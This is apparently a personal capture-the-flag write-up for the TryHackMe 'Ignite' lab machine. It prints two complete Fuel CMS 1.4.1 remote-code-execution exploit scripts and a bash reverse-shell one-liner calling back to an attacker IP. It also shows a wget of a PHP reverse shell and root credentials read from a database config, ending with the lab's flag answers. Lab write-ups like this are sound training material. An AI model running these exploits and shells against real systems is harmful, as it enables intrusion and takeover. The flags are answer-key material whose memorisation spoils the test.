# Task 1 Root it!
## User.txt
```
$ nmap -sC -sV 10.10.104.93                                         
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-14 10:12 IST
Nmap scan report for 10.10.104.93
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.66 seconds
```

![[2 107.png]]

![[3 85.png]]

![[4 72.png]]

```
$  searchsploit fuel cms            
----------------------------------------------------------------------------------- -----------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- -----------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                         | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                         | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                         | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                        | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                               | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                   | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                 | php/webapps/50884.txt
----------------------------------------------------------------------------------- -----------------------------------Shellcodes: No Results
```

```
$ sudo searchsploit -m linux/webapps/47138.py
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
File Type: Python script, ASCII text executable

Copied to: /home/kunal/tryhackme/ignite/47138.py
```

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib.parse
import urllib.request

url = "http://10.10.104.93"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start
 
while 1:
        xxxx = input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
#       proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print(r.text[0:dup])
```

```
$ sudo searchsploit -m php/webapps/50477.py
  Exploit: Fuel CMS 1.4.1 - Remote Code Execution (3)
      URL: https://www.exploit-db.com/exploits/50477
     Path: /usr/share/exploitdb/exploits/php/webapps/50477.py
File Type: Python script, ASCII text executable

Copied to: /home/kunal/tryhackme/ignite/50477.py
```

```python
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

        args = parser.parse_args()

        if len(sys.argv) <=2:
                parser.print_usage()
                sys.exit()

        return args


args = get_arguments()
url = args.url

if "http" not in url:
        sys.stderr.write("Enter vaild url")
        sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
        cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

        main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

        r = requests.get(main_url)

        #<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

        output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
        print(output[0])
        if cmd == "exit":
                break 
```

```
$ python3 50477.py -u http://10.10.104.93
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
```


```
bash -i >& /dev/tcp/10.17.48.138/9999 0>&1
```

```
$ python3 -m http.server             
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
Enter Command $wget http://10.17.48.138:8000/php-reverse-shell.php
system

Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
php-reverse-shell.php
php-reverse-shell.php.1
php-reverse-shell.php.10
php-reverse-shell.php.11
php-reverse-shell.php.12
php-reverse-shell.php.2
php-reverse-shell.php.3
php-reverse-shell.php.4
php-reverse-shell.php.5
php-reverse-shell.php.6
php-reverse-shell.php.7
php-reverse-shell.php.8
php-reverse-shell.php.9
robots.txt
```

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.104.93 - - [14/Dec/2023 12:25:38] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:39] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:39] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:39] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:39] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:40] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:40] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:40] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:40] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:41] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:41] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:41] "GET /php-reverse-shell.php HTTP/1.1" 200 -
10.10.104.93 - - [14/Dec/2023 12:25:42] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

![[5 55.png]]

```
 nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.104.93] 42600
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 22:36:03 up  2:06,  0 users,  load average: 0.47, 0.86, 0.95
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```
$ cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b 
```

## Answer
```
6470e394cbf6dab6a91682cc8585059b
```

## Root.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ 
```

```
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
cat database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
```

| Username | Password |
| -------- | -------- |
| root     | mememe   |

```
www-data@ubuntu:/$ su root
su root
Password: mememe

root@ubuntu:/# 
```

```
root@ubuntu:/# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
```

## Answer
```
b9bbcb33e11b80be759c4e844862482d
```